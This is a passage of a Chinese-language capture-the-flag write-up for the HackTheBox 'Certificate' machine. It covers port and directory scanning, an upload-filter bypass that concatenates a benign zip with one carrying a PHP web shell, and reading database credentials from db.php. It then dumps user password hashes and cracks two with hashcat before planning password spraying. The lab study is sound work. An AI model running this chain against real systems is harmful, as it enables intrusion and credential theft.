1.3.6.1.4.1.311.25.1:&lt;unsupported&gt;, DNS:DC01.certificate.htb</span><br><span class="line">| Not valid before: 2024-11-04T03:14:54            </span><br><span class="line">|_Not valid after:  2025-11-04T03:14:54            </span><br><span class="line">445/tcp   open  microsoft-ds?                                                 </span><br><span class="line">464/tcp   open  kpasswd5?                                                     </span><br><span class="line">593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0                                                                                            </span><br><span class="line">636/tcp   open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: certificate.htb0., Site: Default-First-Site-Name)</span><br><span class="line">| ssl-cert: Subject: commonName=DC01.certificate.htb    </span><br><span class="line">| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:&lt;unsupported&gt;, DNS:DC01.certificate.htb</span><br><span class="line">| Not valid before: 2024-11-04T03:14:54                                                                                                                      </span><br><span class="line">|_Not valid after:  2025-11-04T03:14:54                  </span><br><span class="line">|_ssl-<span class="built_in">date</span>: 2025-06-01T07:37:42+00:00; +7h38m40s from scanner <span class="keyword">time</span>.                                                                                          </span><br><span class="line">3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: certificate.htb0., Site: Default-First-Site-Name)</span><br><span class="line">|_ssl-<span class="built_in">date</span>: 2025-06-01T07:37:41+00:00; +7h38m40s from scanner <span class="keyword">time</span>.</span><br><span class="line">| ssl-cert: Subject: commonName=DC01.certificate.htb</span><br><span class="line">| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:&lt;unsupported&gt;, DNS:DC01.certificate.htb</span><br><span class="line">| Not valid before: 2024-11-04T03:14:54 </span><br><span class="line">|_Not valid after:  2025-11-04T03:14:54 </span><br><span class="line">3269/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: certificate.htb0., Site: Default-First-Site-Name)                             </span><br><span class="line">| ssl-cert: Subject: commonName=DC01.certificate.htb                                                                                                         </span><br><span class="line">| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:&lt;unsupported&gt;, DNS:DC01.certificate.htb</span><br><span class="line">| Not valid before: 2024-11-04T03:14:54 </span><br><span class="line">|_Not valid after:  2025-11-04T03:14:54 </span><br><span class="line">|_ssl-<span class="built_in">date</span>: 2025-06-01T07:37:42+00:00; +7h38m40s from scanner <span class="keyword">time</span>.</span><br><span class="line">5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)</span><br><span class="line">|_http-server-header: Microsoft-HTTPAPI/2.0</span><br><span class="line">|_http-title: Not Found</span><br><span class="line">9389/tcp  open  mc-nmf        .NET Message Framing</span><br><span class="line">49667/tcp open  msrpc         Microsoft Windows RPC</span><br><span class="line">49691/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0</span><br><span class="line">49692/tcp open  msrpc         Microsoft Windows RPC</span><br><span class="line">49693/tcp open  msrpc         Microsoft Windows RPC</span><br><span class="line">49709/tcp open  msrpc         Microsoft Windows RPC</span><br><span class="line">49715/tcp open  msrpc         Microsoft Windows RPC</span><br><span class="line">49734/tcp open  msrpc         Microsoft Windows RPC</span><br><span class="line">Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port</span><br><span class="line">Device <span class="built_in">type</span>: general purpose</span><br><span class="line">Running (JUST GUESSING): Microsoft Windows 2019|10 (97%)</span><br><span class="line">OS CPE: cpe:/o:microsoft:windows_server_2019 cpe:/o:microsoft:windows_10</span><br><span class="line">Aggressive OS guesses: Windows Server 2019 (97%), Microsoft Windows 10 1903 - 21H1 (91%)</span><br><span class="line">No exact OS matches <span class="keyword">for</span> host (<span class="built_in">test</span> conditions non-ideal).</span><br><span class="line">Service Info: Hosts: certificate.htb, DC01; OS: Windows; CPE: cpe:/o:microsoft:windows</span><br><span class="line">Host script results:</span><br><span class="line">| smb2-time: </span><br><span class="line">|   <span class="built_in">date</span>: 2025-06-01T07:37:02</span><br><span class="line">|_  start_date: N/A</span><br><span class="line">| smb2-security-mode: </span><br><span class="line">|   3:1:1: </span><br><span class="line">|_    Message signing enabled and required</span><br><span class="line">|_clock-skew: mean: 7h38m39s, deviation: 0s, median: 7h38m39s</span><br></pre></td></tr></table></figure>
<p>先加一下hosts</p>
<h3 id="80"><a href="#80" class="headerlink" title="80"></a>80</h3><p><img src="/images/certificate.png"><br>看起来平平无奇<br>有个注册和登录<br>还是模糊测试一下子域和目录吧<br>子域没扫出什么来</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line">$ dirsearch -u http://certificate.htb                                                                                                                                       10:45:18 [27/762]</span><br><span class="line">/usr/share/dirsearch/lib/core/installation.py:24: UserWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html. The pkg_resources package </span><br><span class="line">is slated <span class="keyword">for</span> removal as early as 2025-11-30. Refrain from using this package or pin to Setuptools&lt;81.</span><br><span class="line">  import pkg_resources                                                                        </span><br><span class="line">                                                                                              </span><br><span class="line">  _|. _ _  _  _  _ _|_    v0.4.3                                                              </span><br><span class="line"> (_||| _) (/_(_|| (_| )                                                                       </span><br><span class="line">                                                                                              </span><br><span class="line">Extensions: php, asp, aspx, jsp, html, htm | HTTP method: GET | Threads: 25 | Wordlist size: 12289</span><br><span class="line">                                                                                              </span><br><span class="line">Target: http://certificate.htb/                                                               </span><br><span class="line">                                                                                              </span><br><span class="line">[10:42:24] Scanning:                                                                          </span><br><span class="line">[10:43:53] 200 -   14KB - /about.php            </span><br><span class="line">[10:44:39] 403 -   304B - /cgi-bin/             </span><br><span class="line">[10:44:40] 500 -   638B - /cgi-bin/printenv.pl  </span><br><span class="line">[10:44:52] 200 -     0B - /db.php               </span><br><span class="line">[10:45:01] 503 -   404B - /examples/            </span><br><span class="line">[10:45:01] 503 -   404B - /examples/jsp/%252e%252e/%252e%252e/manager/html/                                                                                                                  </span><br><span class="line">[10:45:01] 503 -   404B - /examples/jsp/snp/snoop.jsp                    </span><br><span class="line">[10:45:01] 503 -   404B - /examples/websocket/index.xhtml</span><br><span class="line">[10:45:01] 503 -   404B - /examples/servlet/SnoopServlet</span><br><span class="line">[10:45:01] 503 -   404B - /examples             </span><br><span class="line">[10:45:01] 503 -   404B - /examples/servlets/servlet/RequestHeaderExample</span><br><span class="line">[10:45:01] 503 -   404B - /examples/servlets/index.html</span><br><span class="line">[10:45:01] 503 -   404B - /examples/servlets/servlet/CookieExample</span><br><span class="line">[10:45:01] 503 -   404B - /examples/jsp/index.html</span><br><span class="line">[10:45:06] 200 -    3KB - /footer.php                   </span><br><span class="line">[10:45:11] 200 -    2KB - /header.php                                                                                                                                                        </span><br><span class="line">[10:45:17] 403 -   304B - /index.php::<span class="variable">$DATA</span>     </span><br><span class="line">[10:45:17] 200 -   22KB - /index.php            </span><br><span class="line">[10:45:17] 200 -   22KB - /index.pHp            </span><br><span class="line">[10:45:17] 200 -   22KB - /index.php/login/  </span><br><span class="line">[10:45:17] 200 -   22KB - /index.php.           </span><br><span class="line">[10:45:21] 200 -    9KB - /login.php            </span><br><span class="line">[10:45:21] 302 -     0B - /logout.php  -&gt;  login.php</span><br><span class="line">[10:45:43] 403 -   423B - /phpmyadmin           </span><br><span class="line">[10:45:45] 403 -   423B - /phpmyadmin/          </span><br><span class="line">[10:45:45] 403 -   423B - /phpmyadmin/index.php </span><br><span class="line">[10:45:45] 403 -   423B - /phpmyadmin/ChangeLog </span><br><span class="line">[10:45:45] 403 -   423B - /phpmyadmin/docs/html/index.html</span><br><span class="line">[10:45:45] 403 -   423B - /phpmyadmin/doc/html/index.html</span><br><span class="line">[10:45:45] 403 -   423B - /phpmyadmin/phpmyadmin/index.php</span><br><span class="line">[10:45:45] 403 -   423B - /phpmyadmin/scripts/setup.php</span><br><span class="line">[10:45:45] 403 -   423B - /phpmyadmin/README    </span><br><span class="line">[10:45:55] 200 -   11KB - /register.php         </span><br><span class="line">[10:46:00] 403 -   423B - /server-status        </span><br><span class="line">[10:46:00] 403 -   423B - /server-info          </span><br><span class="line">[10:46:00] 403 -   423B - /server-status/       </span><br><span class="line">[10:46:10] 301 -   343B - /static  -&gt;  http://certificate.htb/static/                          </span><br><span class="line">[10:46:10] 301 -   345B - /static..  -&gt;  http://certificate.htb/static../</span><br><span class="line">[10:46:20] 403 -   304B - /Trace.axd::<span class="variable">$DATA</span>     </span><br><span class="line">[10:46:21] 302 -     0B - /upload.php  -&gt;  login.php</span><br><span class="line">[10:46:28] 403 -   304B - /web.config::<span class="variable">$DATA</span>    </span><br><span class="line">[10:46:29] 403 -   304B - /webalizer            </span><br><span class="line">[10:46:29] 403 -   304B - /webalizer/</span><br></pre></td></tr></table></figure>
<p>有一个db.php，但是是个白页，还是注册吧<br>注册了一个登录进去但是是个白页<br><img src="/images/certificate-1.png"><br>嗷，角色选教师的话会是白页<br>正常选学生的话会直接跳转到<br><img src="/images/certificate-2.png"><br><img src="/images/certificate-3.png"><br>在里面找一个课程点进去<br>这里的submit没啥用没往下滑<br><img src="/images/certificate-4.png"><br>还有watch和submit<br>只有submit有用，会跳转到upload.php，但是跟了参数<br><img src="/images/certificate-5.png"><br>图中还说了只要<code> .pdf .docx .pptx .xlsx</code><br>    Please select the assignment file you want to upload (the file will be reviewed by the course instructor)<br>    We accept only the following file types: .pdf .docx .pptx .xlsx<br>    You include the assignment file in .zip archive file to reduce it’s size<br>    请选择您要上传的作业文件（文件将由课程讲师审核）<br>    我们仅接受以下文件类型：.pdf .docx .pptx .xlsx<br>    请将作业文件包含在 .zip 压缩包中以减小其大小<br>看看能不能绕过一下<br>上burp<br>这也没啥用<br><img src="/images/certificate-6.png"></p>
<h3 id="zip文件串联"><a href="#zip文件串联" class="headerlink" title="zip文件串联"></a>zip文件串联</h3><p>zip传不上去呀，Google一下<code>zip bypass windows</code><br>然后可以找到很多有关于<code>CVE-2025-0411</code>的文章，我翻到了<a target="_blank" rel="noopener" href="https://www.pcworld.com/article/2599106/update-now-this-7-zip-exploit-bypasses-crucial-windows-protections.html">Update now! This 7-Zip exploit bypasses crucial Windows protections</a><br>那我再给他压缩一遍试试<br><img src="/images/certificate-7.png"><br><img src="/images/certificate-8.png"><br>点那个here会直接跳转到上传的页面，因为我上传的是一个zip，他会直接下载<br><img src="/images/certificate-9.png"><br>这怎么搞，继续Google<br>找到了一个叫<a target="_blank" rel="noopener" href="https://duckduckgo.com/?t=h_&q=zip%E6%96%87%E4%BB%B6%E8%A7%84%E9%81%BFWindows%E6%96%87%E4%BB%B6%E6%A3%80%E6%B5%8B&ia=web">zip文件串联</a>的东西（其中的知识可以Google学习一下）<br>那我们打包串联两个zip文件，一个随便给一个，另一个写我们的恶意shell</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">$ <span class="built_in">echo</span> <span class="string">&#x27;Ctrl+Alt&#x27;</span> &gt; out.pdf</span><br><span class="line"></span><br><span class="line">$ <span class="built_in">cat</span> out.pdf </span><br><span class="line">Ctrl+Alt</span><br><span class="line"></span><br><span class="line">$ zip out.zip out.pdf </span><br><span class="line">  adding: out.pdf (stored 0%)</span><br><span class="line"></span><br><span class="line">$ nano shell.php</span><br><span class="line"></span><br><span class="line">$ zip shell.zip shell.php </span><br><span class="line">  adding: shell.php (deflated 32%)</span><br><span class="line"></span><br><span class="line">$ <span class="built_in">cat</span> out.zip shell.zip &gt; xxx.zip</span><br><span class="line"></span><br><span class="line">$ <span class="built_in">ls</span> -la</span><br><span class="line">drwxr-xr-x wansh wansh 190 B  Tue Jun  3 10:04:41 2025  .</span><br><span class="line">drwxr-xr-x wansh wansh  70 B  Sun Jun  1 15:38:04 2025  ..</span><br><span class="line">.rw-r--r-- root  root  4.8 KB Sun Jun  1 15:59:49 2025  nmap.txt</span><br><span class="line">.rw-r--r-- wansh wansh   9 B  Tue Jun  3 10:02:30 2025  out.pdf</span><br><span class="line">.rw-r--r-- wansh wansh 173 B  Tue Jun  3 10:02:41 2025  out.zip</span><br><span class="line">.rw-r--r-- wansh wansh 348 B  Tue Jun  3 10:04:35 2025  shell.php</span><br><span class="line">.rw-r--r-- wansh wansh 406 B  Tue Jun  3 10:04:41 2025  shell.zip</span><br><span class="line">.rw-r--r-- wansh wansh 348 B  Mon Jun  2 11:41:59 2025  xxx.php</span><br><span class="line">.rw-r--r-- wansh wansh 579 B  Tue Jun  3 10:04:56 2025  xxx.zip</span><br><span class="line">.rw-r--r-- wansh wansh 566 B  Mon Jun  2 13:15:57 2025  xxx1.zip</span><br><span class="line">.rw-r--r-- wansh wansh 804 B  Mon Jun  2 13:29:58 2025  xxx2.zip</span><br></pre></td></tr></table></figure>
<p>上传试一下<br><img src="/images/certificate-10.png"><br>上传上去了，但是是其中另一个的，改一下url<br><img src="/images/certificate-11.png"><br>ok了，拿到了一个xamppuser的用户</p>
<h2 id="shell-as-xamppuser"><a href="#shell-as-xamppuser" class="headerlink" title="shell as xamppuser"></a>shell as xamppuser</h2><p>根据这个名字，猜想根目录下应该有xampp的文件夹</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">PS C:\&gt; <span class="built_in">dir</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    Directory: C:\</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Mode                LastWriteTime         Length Name                                                                  </span><br><span class="line">----                -------------         ------ ----                                                                  </span><br><span class="line">d-----        11/5/2022  11:58 AM                PerfLogs                                                              </span><br><span class="line">d-r---        4/28/2025   2:26 PM                Program Files                                                         </span><br><span class="line">d-----        9/15/2018  12:21 AM                Program Files (x86)                                                   </span><br><span class="line">d-r---       12/29/2024   5:30 PM                Users                                                                 </span><br><span class="line">d-----         5/5/2025  11:42 AM                Windows                                                               </span><br><span class="line">d-----       12/29/2024   6:33 PM                xampp     </span><br></pre></td></tr></table></figure>
<p>oh yes yes<br>进去翻一翻</p>
<h3 id="get-hash-in-mysql-and-crack"><a href="#get-hash-in-mysql-and-crack" class="headerlink" title="get hash in mysql and crack"></a>get hash in mysql and crack</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">PS C:\xampp\htdocs\certificate.htb&gt; <span class="built_in">dir</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    Directory: C:\xampp\htdocs\certificate.htb</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Mode                LastWriteTime         Length Name                                                                  </span><br><span class="line">----                -------------         ------ ----                                                                  </span><br><span class="line">d-----       12/26/2024   1:49 AM                static                                                                </span><br><span class="line">-a----       12/24/2024  12:45 AM           7179 about.php                                                             </span><br><span class="line">-a----       12/30/2024   1:50 PM          17197 blog.php                                                              </span><br><span class="line">-a----       12/30/2024   2:02 PM           6560 contacts.php                                                          </span><br><span class="line">-a----       12/24/2024   6:10 AM          15381 course-details.php                                                    </span><br><span class="line">-a----       12/24/2024  12:53 AM           4632 courses.php                                                           </span><br><span class="line">-a----       12/23/2024   4:46 AM            549 db.php                                                                </span><br><span class="line">-a----       12/22/2024  10:07 AM           1647 feature-area-2.php                                                    </span><br><span class="line">-a----       12/22/2024  10:22 AM           1331 feature-area.php                                                      </span><br><span class="line">-a----       12/22/2024  10:16 AM           2955 footer.php                                                            </span><br><span class="line">-a----       12/23/2024   5:13 AM           2351 header.php                                                            </span><br><span class="line">-a----       12/24/2024  12:52 AM           9497 index.php                                                             </span><br><span class="line">-a----       12/25/2024   1:34 PM           5908 login.php                                                             </span><br><span class="line">-a----       12/23/2024   5:14 AM            153 logout.php                                                            </span><br><span class="line">-a----       12/24/2024   1:27 AM           5321 popular-courses-area.php                                              </span><br><span class="line">-a----       12/25/2024   1:27 PM           8240 register.php                                                          </span><br><span class="line">-a----       12/28/2024  11:26 PM          10366 upload.php         </span><br></pre></td></tr></table></figure>
<p>在<code>C:\xampp\htdocs\certificate.htb</code>文件夹下面可以看到我们目录扫的时候出现的db.php，那我们直接看一下</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">PS C:\xampp\htdocs\certificate.htb&gt; <span class="built_in">type</span> db.php</span><br><span class="line">&lt;?php</span><br><span class="line">// Database connection using PDO</span><br><span class="line">try &#123;</span><br><span class="line">    <span class="variable">$dsn</span> = <span class="string">&#x27;mysql:host=localhost;dbname=Certificate_WEBAPP_DB;charset=utf8mb4&#x27;</span>;</span><br><span class="line">    <span class="variable">$db_user</span> = <span class="string">&#x27;certificate_webapp_user&#x27;</span>; // Change to your DB username</span><br><span class="line">    <span class="variable">$db_passwd</span> = <span class="string">&#x27;cert!f!c@teDBPWD&#x27;</span>; // Change to your DB password</span><br><span class="line">    <span class="variable">$options</span> = [</span><br><span class="line">        PDO::ATTR_ERRMODE =&gt; PDO::ERRMODE_EXCEPTION,</span><br><span class="line">        PDO::ATTR_DEFAULT_FETCH_MODE =&gt; PDO::FETCH_ASSOC,</span><br><span class="line">    ];</span><br><span class="line">    <span class="variable">$pdo</span> = new PDO(<span class="variable">$dsn</span>, <span class="variable">$db_user</span>, <span class="variable">$db_passwd</span>, <span class="variable">$options</span>);</span><br><span class="line">&#125; catch (PDOException <span class="variable">$e</span>) &#123;</span><br><span class="line">    die(<span class="string">&#x27;Database connection failed: &#x27;</span> . <span class="variable">$e</span>-&gt;getMessage());</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<p>给了一个用户还有一个密码，看一下有没有在运行</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">PS C:\xampp\htdocs\certificate.htb&gt; tasklist | findstr /i mysql</span><br><span class="line">mysqld.exe                    5012                            0     16,836 K</span><br></pre></td></tr></table></figure>
<p>有的，兄弟有的<br>mysql.exe在<code>PS C:\xampp\mysql\bin&gt;</code>文件夹中，我们可以利用一下看看数据库里面都有什么</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">PS C:\xampp\mysql\bin&gt; .\mysql.exe -u <span class="string">&quot;certificate_webapp_user&quot;</span> -p<span class="string">&quot;cert!f!c@teDBPWD&quot;</span> -e <span class="string">&quot;show databases;&quot;</span></span><br><span class="line">Database</span><br><span class="line">certificate_webapp_db</span><br><span class="line">information_schema</span><br><span class="line"><span class="built_in">test</span></span><br><span class="line"><span class="comment"># 这里注意使用双引号</span></span><br><span class="line">PS C:\xampp\mysql\bin&gt; .\mysql.exe -u <span class="string">&quot;certificate_webapp_user&quot;</span> -p<span class="string">&quot;cert!f!c@teDBPWD&quot;</span> -D <span class="string">&quot;certificate_webapp_db&quot;</span> -e <span class="string">&quot;show tables;&quot;</span></span><br><span class="line">Tables_in_certificate_webapp_db</span><br><span class="line">course_sessions</span><br><span class="line">courses</span><br><span class="line"><span class="built_in">users</span></span><br><span class="line">users_courses</span><br><span class="line"></span><br><span class="line">PS C:\xampp\mysql\bin&gt; .\mysql.exe -u <span class="string">&quot;certificate_webapp_user&quot;</span> -p<span class="string">&quot;cert!f!c@teDBPWD&quot;</span> -D <span class="string">&quot;certificate_webapp_db&quot;</span> -e <span class="string">&quot;select * from users;&quot;</span></span><br><span class="line"><span class="built_in">id</span>      first_name      last_name       username        email   password        created_at      role    is_active</span><br><span class="line">1       Lorra   Armessa Lorra.AAA       lorra.aaa@certificate.htb       $2y$04<span class="variable">$bZs2FUjVRiFswY84CUR8ve02ymuiy0QD23XOKFuT6IM2sBbgQvEFG</span>    2024-12-23 12:43:10     teacher 1</span><br><span class="line">6       Sara    Laracrof        Sara1200        sara1200@gmail.com      $2y$04<span class="variable">$pgTOAkSnYMQoILmL6MRXLOOfFlZUPR4lAD2kvWZj</span>.i/dyvXNSqCkK    2024-12-23 12:47:11     teacher 1</span><br><span class="line">7       John    Wood    Johney  johny009@mail.com       $2y$04<span class="variable">$VaUEcSd6p5NnpgwnHyh8zey13zo</span>/hL7jfQd9U.PGyEW3yqBf.IxRq    2024-12-23 13:18:18     student 1</span><br><span class="line">8       Havok   Watterson       havokww havokww@hotmail.com     $2y$04<span class="variable">$XSXoFSfcMoS5Zp8ojTeUSOj6ENEun6oWM93mvRQgvaBufba5I5nti</span>    2024-12-24 09:08:04     teacher 1</span><br><span class="line">9       Steven  Roman   stev    steven@yahoo.com        $2y$04<span class="variable">$6FHP</span>.7xTHRGYRI9kRIo7deUHz0LX.vx2ixwv0cOW6TDtRGgOhRFX2    2024-12-24 12:05:05     student 1</span><br><span class="line">10      Sara    Brawn   sara.b  sara.b@certificate.htb  $2y$04<span class="variable">$CgDe</span>/Thzw/Em/M4SkmXNbu0YdFo6uUs3nB.pzQPV.g8UdXikZNdH6    2024-12-25 21:31:26     admin   1</span><br><span class="line">12      ooa     ooa     ooa     ooa@ooa.ooa     $2y$04<span class="variable">$i4ayUfOuqDxO4lh1bkSli</span>.Qklrn2TkKx7Lufqp7jWkvbx1Kj.w5W2    2025-06-03 02:12:13     teacher 0</span><br><span class="line">13      hacker  hacker  hacker  hacker@gmail.com        $2y$04<span class="variable">$W</span>/b58ehBqKc9Pghh9Y8M..51/30.p2epwYIsJutFCy7AVSnxy8ANG    2025-06-03 02:27:41     student 1</span><br><span class="line">14      hackerteacher   hackerteacher   hackerteacher   hackerteacher@gmail.com $2y$04<span class="variable">$3KUXgL7VvxHDe508I2wY9OEhsWIdYA5Rfa52II6CTPKGIYzH8</span>/bFG    2025-06-03 02:30:09     teacher 0</span><br><span class="line">15      ooo     ooo     ooo     ooo@ooo.ooo     $2y$04<span class="variable">$1ufdOe3</span>/FQh5SNFxmaTgKeN2TmGe.uGRIcmROCfnX51V32pYd2HFq    2025-06-03 02:39:13     teacher 0</span><br><span class="line">16      wansh   wansh   wansh   wansh@certificate.htb   $2y$04<span class="variable">$rgg5t</span>.By4hNaxvI3A/0WF.ZW3f1qQ6aE.1u0sDbwK2kaimzE6pULa    2025-06-03 02:46:16     student 1</span><br><span class="line">17      aaa     aaa     aaa     aaa@aaa.aaa     $2y$04<span class="variable">$bEBVFPl3FY</span>/GdRRDOyaCF.5a1lKdcQVrv0Aj2azp85Vv87pEO6HBG    2025-06-03 02:58:19     teacher 0</span><br><span class="line">18      zxc     zxc     zxc     zxc@gmail.com   $2y$04<span class="variable">$5GKYBBhd</span>.ucWA60T9BAhb.hYbLB8yPjVIxxpqMlFL6SoUmPbk4aCm    2025-06-03 03:22:40     student 1</span><br></pre></td></tr></table></figure>
<p>出大货了，鼠鼠得吃，下一步就是看看能不能解</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">$ <span class="built_in">cat</span> <span class="built_in">hash</span> | awk -F <span class="string">&#x27; &#x27;</span> <span class="string">&#x27;&#123;print $6&#125;&#x27;</span> | <span class="built_in">tee</span> <span class="built_in">hash</span> | <span class="built_in">cat</span></span><br><span class="line">$2y$04<span class="variable">$bZs2FUjVRiFswY84CUR8ve02ymuiy0QD23XOKFuT6IM2sBbgQvEFG</span></span><br><span class="line">$2y$04<span class="variable">$pgTOAkSnYMQoILmL6MRXLOOfFlZUPR4lAD2kvWZj</span>.i/dyvXNSqCkK</span><br><span class="line">$2y$04<span class="variable">$VaUEcSd6p5NnpgwnHyh8zey13zo</span>/hL7jfQd9U.PGyEW3yqBf.IxRq</span><br><span class="line">$2y$04<span class="variable">$XSXoFSfcMoS5Zp8ojTeUSOj6ENEun6oWM93mvRQgvaBufba5I5nti</span></span><br><span class="line">$2y$04<span class="variable">$6FHP</span>.7xTHRGYRI9kRIo7deUHz0LX.vx2ixwv0cOW6TDtRGgOhRFX2</span><br><span class="line">$2y$04<span class="variable">$CgDe</span>/Thzw/Em/M4SkmXNbu0YdFo6uUs3nB.pzQPV.g8UdXikZNdH6</span><br><span class="line">$2y$04<span class="variable">$i4ayUfOuqDxO4lh1bkSli</span>.Qklrn2TkKx7Lufqp7jWkvbx1Kj.w5W2</span><br><span class="line">$2y$04<span class="variable">$W</span>/b58ehBqKc9Pghh9Y8M..51/30.p2epwYIsJutFCy7AVSnxy8ANG</span><br><span class="line">$2y$04<span class="variable">$3KUXgL7VvxHDe508I2wY9OEhsWIdYA5Rfa52II6CTPKGIYzH8</span>/bFG</span><br><span class="line">$2y$04<span class="variable">$1ufdOe3</span>/FQh5SNFxmaTgKeN2TmGe.uGRIcmROCfnX51V32pYd2HFq</span><br><span class="line">$2y$04<span class="variable">$rgg5t</span>.By4hNaxvI3A/0WF.ZW3f1qQ6aE.1u0sDbwK2kaimzE6pULa</span><br><span class="line">$2y$04<span class="variable">$bEBVFPl3FY</span>/GdRRDOyaCF.5a1lKdcQVrv0Aj2azp85Vv87pEO6HBG</span><br><span class="line">$2y$04<span class="variable">$5GKYBBhd</span>.ucWA60T9BAhb.hYbLB8yPjVIxxpqMlFL6SoUmPbk4aCm</span><br><span class="line"></span><br><span class="line">$ hashcat -a 0 -m 3200 <span class="built_in">hash</span> /usr/share/payloads/seclists/Passwords/Leaked-Databases/rockyou.txt --show</span><br><span class="line">$2y$04<span class="variable">$CgDe</span>/Thzw/Em/M4SkmXNbu0YdFo6uUs3nB.pzQPV.g8UdXikZNdH6:Blink182</span><br><span class="line">$2y$04<span class="variable">$W</span>/b58ehBqKc9Pghh9Y8M..51/30.p2epwYIsJutFCy7AVSnxy8ANG:hacker</span><br></pre></td></tr></table></figure>
<p>解了两个，密码喷射一下<br>  但是猜测是sara.b的，因为里面的就他看着像hhh</p>
